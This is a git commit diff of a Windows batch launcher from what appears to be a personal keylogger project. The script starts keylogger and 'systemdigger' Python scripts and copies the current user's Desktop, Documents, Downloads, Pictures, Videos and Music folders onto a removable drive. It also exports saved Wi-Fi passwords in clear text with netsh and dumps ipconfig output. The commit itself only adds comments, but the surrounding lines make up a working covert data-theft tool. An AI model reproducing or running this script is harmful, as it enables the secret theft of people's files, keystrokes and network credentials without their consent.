c66b76fd78c5a85cd3e3a48bd3426564a8e2a3f7
adityababar07 <adityababar715@gmail.com>
2021-02-10 00:48:06 +0530

    laucher.bat

--- launcher.bat
+++ launcher.bat
@@ -1,8 +1,10 @@
 @echo off
 
+@REm start programes
 start "" "H:\keylogger\keylogger.pyw"
 start "" "H:\keylogger\systemdigger.pyw"
 
+@REM make directories
 MKDIR "H:\keylogger\data"
 MKDIR "H:\keylogger\data\%username%"
 MKDIR "H:\keylogger\data\%username%\Desktop"
@@ -11,6 +13,7 @@ MKDIR "H:\keylogger\data\%username%\Pictures"
 MKDIR "H:\keylogger\data\%username%\Videos"
 MKDIR "H:\keylogger\data\%username%\Music"
 
+@REM copy files to pendrive
 XCOPY "C:\Users\%username%\Desktop" "H:\keylogger\data\%username%\Desktop"
 XCOPY "C:\Users\%username%\Downloads" "H:\keylogger\data\%username%\Downloads"
 XCOPY "C:\Users\%username%\Pictures" "H:\keylogger\data\%username%\Pictures"
@@ -18,8 +21,11 @@ XCOPY "C:\Users\%username%\Documents" "H:\keylogger\data\%username%\Documents"
 XCOPY "C:\Users\%username%\Videos" "H:\keylogger\data\%username%\Videos"
 XCOPY "C:\Users\%username%\Music" "H:\keylogger\data\%username%\Music"
 
+@REM wifi passwords
 netsh wlan export profile key=clear
 
+@REM ipaddress
+ipconfig > ipconfig.txt 
 
 
 @REM systeminfo > systeminfo.txt
